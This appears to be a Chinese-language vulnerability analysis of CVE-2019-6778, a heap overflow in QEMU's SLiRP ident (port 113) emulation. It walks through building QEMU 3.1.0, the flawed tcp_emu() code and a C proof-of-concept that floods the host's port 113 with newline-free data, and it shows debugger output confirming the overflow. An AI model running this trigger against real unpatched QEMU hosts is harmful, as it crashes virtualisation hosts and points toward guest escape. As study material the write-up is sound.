### 漏洞描述

`qemu-kvm`默认使用的是`-net nic -net user`的参数，提供了一种用户模式（user-mode）的网络模拟。使用用户模式的网络的客户机可以连通宿主机及外部的网络。用户模式网络是完全由QEMU自身实现的，不依赖于其他的工具（bridge-utils、dnsmasq、iptables等），而且不需要root用户权限。QEMU使用Slirp实现了一整套TCP/IP协议栈，并且使用这个协议栈实现了一套虚拟的NAT网络。SLiRP模块主要模拟了网络应用层协议，其中包括IP协议（v4和v6）、DHCP协议、ARP协议等。

cve-2019-6778这个漏洞存在于QEMU的网络模块SLiRP中。该模块中的`tcp_emu()`函数对端口113(*Identification protocol*)的数据进行处理时，没有进行有效的数据验证，导致堆溢出。经过构造，可实现以QEMU进程权限执行任意代码。

### 环境配置

使用qemu-3.1.0版本来编译

```shell
git clone git://git.qemu-project.org/qemu.git
cd qemu
git checkout tags/v3.1.0
mkdir -p bin/debug/naive
cd bin/debug/naive
../../../configure --target-list=x86_64-softmmu --enable-debug --disable-werror
make
```

编译出来qemu的路径为`./qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64`，查看版本：

```shell
$ ./qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64 -version
QEMU emulator version 3.1.0 (v3.1.0-dirty)
Copyright (c) 2003-2018 Fabrice Bellard and the QEMU Project developers
```

内核的编译和文件系统的编译在cve-2015-5165中已经成功创建了，这里直接使用就好。

启动命令为：

```shell
./qemu/bin/debug/naive/x86_64-softmmu/qemu-system-x86_64 \
    -kernel ./linux-5.2.11/arch/x86/boot/bzImage  \
    -append "console=ttyS0 root=/dev/sda rw"  \
    -hda ./rootfs.img  \
    -enable-kvm -m 2G -nographic \
    -L ./pc-bios -smp 1 \
    -net user,hostfwd=tcp::2222-:22 -net nic
```

qemu启动的虚拟机的ip地址默认为10.0.2.15，这个可以在虚拟机中用`ifconfig`命令来查看，对应的宿主机的ip地址默认为10.0.2.2，宿主机中`ifconfig`命令查看不到。

### 漏洞分析

具有漏洞的函数在`qemu/slirp/tcp_subr.c`中

```c
int
tcp_emu(struct socket *so, struct mbuf *m)
{
	...

	switch(so->so_emu) {
		int x, i;

	 case EMU_IDENT:
		/*
		 * Identification protocol as per rfc-1413
		 */

		{
			...
			struct sbuf *so_rcv = &so->so_rcv;

			memcpy(so_rcv->sb_wptr, m->m_data, m->m_len);
			so_rcv->sb_wptr += m->m_len;
			so_rcv->sb_rptr += m->m_len;
			m->m_data[m->m_len] = 0; /* NULL terminate */
			if (strchr(m->m_data, '\r') || strchr(m->m_data, '\n')) {
				if (sscanf(so_rcv->sb_data, "%u%*[ ,]%u", &n1, &n2) == 2) {
					......
				}
                  so_rcv->sb_cc = snprintf(so_rcv->sb_data,so_rcv->sb_datalen,
                                           "%d,%d\r\n", n1, n2);
				so_rcv->sb_rptr = so_rcv->sb_data;
				so_rcv->sb_wptr = so_rcv->sb_data + so_rcv->sb_cc;
			}
			m_free(m);
			return 0;
		}
```

对应的结构体，`m`的定义为`struct mbuf`，`so_rcv`的定义为`struct sbuf`，`mbuf`结构体用来保存ip传输层的数据，`sbuf`结构体用来保存tcp网络层的数据

```c
struct mbuf {
	/* XXX should union some of these! */
	/* header at beginning of each mbuf: */
	struct	mbuf *m_next;		/* Linked list of mbufs */
	struct	mbuf *m_prev;
	struct	mbuf *m_nextpkt;	/* Next packet in queue/record */
	struct	mbuf *m_prevpkt;	/* Flags aren't used in the output queue */
	int	m_flags;		/* Misc flags */

	int	m_size;			/* Size of mbuf, from m_dat or m_ext */
	struct	socket *m_so;

	caddr_t	m_data;			/* Current location of data */
	int	m_len;			/* Amount of data in this mbuf, from m_data */

	Slirp *slirp;
	bool	resolution_requested;
	uint64_t expiration_date;
	char   *m_ext;
	/* start of dynamic buffer area, must be last element */
	char    m_dat[];
};


struct sbuf {
	uint32_t sb_cc;		/* actual chars in buffer */
	uint32_t sb_datalen;	/* Length of data  */
	char	*sb_wptr;	/* write pointer. points to where the next
				 * bytes should be written in the sbuf */
	char	*sb_rptr;	/* read pointer. points to where the next
				 * byte should be read from the sbuf */
	char	*sb_data;	/* Actual data */
};
```

再来关注这几行核心的代码

```c
memcpy(so_rcv->sb_wptr, m->m_data, m->m_len);
so_rcv->sb_wptr += m->m_len;
so_rcv->sb_rptr += m->m_len;
if (strchr(m->m_data, '\r') || strchr(m->m_data, '\n')){
	so_rcv->sb_cc = snprintf(so_rcv->sb_data,so_rcv->sb_datalen,
                                           "%d,%d\r\n", n1, n2);
}
```

可以看到程序先将m->m_data中的数据拷贝到so_rcv->sb_wptr中，so_rcv中的读写指针往后移动，接着对m->m_data中的数据进行判断，是否存在`\r` or `\n`，如果都不存在，那么对于so_rcv->sb_cc这个buffer空间真实大小就不会进行赋值，还是为0的情况。

查看`tcp_enu`的调用函数`tcp_input`函数，代码在`slirp/tcp_input.c`中：

```c
else if (ti->ti_ack == tp->snd_una &&
		    tcpfrag_list_empty(tp) &&
		    ti->ti_len <= sbspace(&so->so_rcv)) {
			...
			/*
			 * Add data to socket buffer.
			 */
			if (so->so_emu) {
				if (tcp_emu(so,m)) sbappend(so, m);
```

`ti`为`tcpiphdr`结构体，其定义以及`sbspace`定义如下：

```c
struct tcpiphdr {
    struct mbuf_ptr ih_mbuf;	/* backpointer to mbuf */
    union {
        struct {
            struct  in_addr ih_src; /* source internet address */
            struct  in_addr ih_dst; /* destination internet address */
            uint8_t ih_x1;          /* (unused) */
            uint8_t ih_pr;          /* protocol */
        } ti_i4;
        struct {
            struct  in6_addr ih_src;
            struct  in6_addr ih_dst;
            uint8_t ih_x1;
            uint8_t ih_nh;
        } ti_i6;
    } ti;
    uint16_t    ti_x0;
    uint16_t    ti_len;             /* protocol length */
    struct      tcphdr ti_t;        /* tcp header */
};

#define sbspace(sb) ((sb)->sb_datalen - (sb)->sb_cc)
```

我们主要观察的就是`ti->ti_len <= sbspace(&so->so_rcv))`这行代码，为`EMU_IDENT`协议时，如果我们的m->m_data数据中一直没有包含`\r` or `\n`，so_rcv->sb_cc数据就不会更新，`sbspace(&so->so_rcv)`就一直等于`so_rcv->sb_datalen`，导致不停的进行`memcpy`，造成堆溢出。

### poc与调试验证

#### poc

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>

int main() {
	int s;
	struct sockaddr_in ip_addr;
	char buf[0x1000];

	s = socket(AF_INET, SOCK_STREAM, 0);
	ip_addr.sin_family = AF_INET;
	// inet_addr()的功能是将一个点分十进制的IP转换成一个长整数型数
	ip_addr.sin_addr.s_addr = inet_addr("10.0.2.2");
	ip_addr.sin_port = htons(113);

	connect(s,(struct sockaddr *)&ip_addr, sizeof(struct sockaddr_in));
	//memset(buf,'A',0x999);
	//buf[0x999] = '\r';  如果将下面的memset(buf,'A',0x1000);换成这两行，so_rcv->sb_cc就会发生变化
	memset(buf,'A',0x1000);
	while(1){
		write(s,buf,0x1000);
	}
	return 0;
}
```

断点在`b /home/zhz/QEMU/qemu/slirp/tcp_subr.c:638`也就是`memcpy(so_rcv->sb_wptr, m->m_data, m->m_len);`

在第一次拷贝前，so_rcv结构体的数据为：

```shell
pwndbg> print *so_rcv
$1 = {
  sb_cc = 0, 
  sb_datalen = 8760, 
  sb_wptr = 0x7ffff02396b0 "\350\a", 
  sb_rptr = 0x7ffff02396b0 "\350\a", 
  sb_data = 0x7ffff02396b0 "\350\a"
```

同时因为m->m_data中不包含`\r` or `\n`，会直接跳过`if (strchr(m->m_data, '\r') || strchr(m->m_data, '\n'))`，拷贝完的结果就变成了：

```shell
pwndbg> print *so_rcv
$2 = {
  sb_cc = 0, 
  sb_datalen = 8760, 
  sb_wptr = 0x7ffff0239c64 "", 
  sb_rptr = 0x7ffff0239c64 "", 
  sb_data = 0x7ffff02396b0 'A' <repeats 200 times>...
}
```

指针移动了，但是`sb_cc`却毫无任何变化。多进行几次就超出了`sb_datalen`的范围造成溢出，导致崩溃